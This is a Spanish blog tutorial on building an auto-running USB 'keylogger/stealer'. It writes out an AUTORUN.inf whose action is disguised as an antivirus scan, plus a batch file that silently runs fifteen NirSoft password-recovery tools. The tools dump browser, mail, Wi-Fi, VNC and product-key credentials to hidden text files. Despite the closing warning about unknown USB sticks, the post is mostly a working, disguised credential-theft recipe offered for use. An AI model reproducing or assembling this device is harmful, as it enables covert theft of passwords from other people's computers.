+++
date = "2015-05-02"
title = "Cómo crear un USB Keylogger/Stealer para recuperar contraseñas"
author = "Javier Olmedo"
toc = false
+++

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_banner.jpg](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_banner.jpg)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_banner.jpg)

Hace unas semana publiqué una entrada sobre **Stealers** y expliqué lo que eran y para que servían, hoy vengo a explicaros como crear un USB que se autoejecute y **recupere todas nuestras contraseñas del PC** de manera automática, únicamente con conectarlo a nuestro PC, sin tocar absolutamente nada, ademas tendrá una función Keylogger, que registrará en un archivo .txt todo lo que pulsemos en nuestro teclado mientras el USB esté conectado al PC.

## Pasos a seguir

1) Inserta un pendrive para formatearlo, haz **«Click derecho»** sobre la unidad y en **«Formatear»**, podemos formatearlo en NTFS o FAT32 (este último es mas recomendado).

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_001.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_001.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_001.png)

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_002.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_002.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_002.png)

2) Abrimos el bloc de notas o similar y escribimos lo siguiente:

```bash
[autorun]
open = launch.bat
UseAutoPlay = 1
ACTION = Escaneando con VirusScan
```

Guardamos el archivo con el nombre **AUTORUN.inf** y lo dejamos dentro del USB.

3) Volvemos al bloc de notas para crear otro archivo, esta vez escribiremos:

```bash
start mspass.exe /stext mspass.txt
start mailpv.exe /stext mailpv.txt
start iepv.exe /stext iepv.txt
start pspv.exe /stext pspv.txt
start PasswordFox.exe /stext passwordfox.txt
start OperaPassView.exe /stext OperaPassView.txt
start ChromePass.exe /stext ChromePass.txt
start Dialupass.exe /stext Dialupass.txt
start netpass.exe /stext netpass.txt
start WirelessKeyView.exe /stext WirelessKeyView.txt
start BulletsPassView.exe /stext BulletsPassView.txt
start VNCPassView.exe /stext VNCPassView.txt
start OpenedFilesView.exe /stext OpenedFilesView.txt
start ProduKey.exe /stext ProduKey.txt
start USBDeview.exe /stext USBDeview.txt
```

Guardamos el archivo con el nombre **LAUNCH.bat** y lo dejamos dentro del USB.

4) Visitamos la web http://www.nirsoft.net/ y nos descargamos las siguiente herramientas:

```bash
mspass.exe
mailpv.exe
iepv.exe
pspv.exe
PasswordFox.exe
OperaPassView.exe
ChromePass.exe
Dialupass2.exe
Netpass.exe
WirelessKeyView.exe
BulletsPassView.exe
VNCPassView.exe
OpenedFilesView.exe
ProduKey.exe
USBDeview.exe
```

Debemos de **descomprimirlas** en la raiz del USB, os dejo un link con las direcciones de las [Herramientas]().

Nos quedaría de la siguiente manera.

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_003.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_003.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_003.png)

5) Descomprimimos todas las herramientas y **ocultamos todos los archivos**, al final todo quedaría así:

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_004.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_004.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_004.png)

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_005.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_005.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_005.png)

6) Quitamos el USB del ordenador y lo volvemos a insertar para comprobar que funciona, si todo ha ido bien nos aparecerán los siguientes **.txt**, que no hace falta que los abra porque ya se sabe lo que contienen, **todas las contraseñas del sistema, incluidas las del WI-FI**.

[![/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_006.png](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_006.png)](/images/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas/como-crear-un-usb-keyloggerstealer-para-recuperar-contrasenas_006.png)

Espero que os haya gustado, y ya sabéis, **no conectéis ningún USB a vuestro ordenador si no es vuestro o dudáis de lo que puede contener**.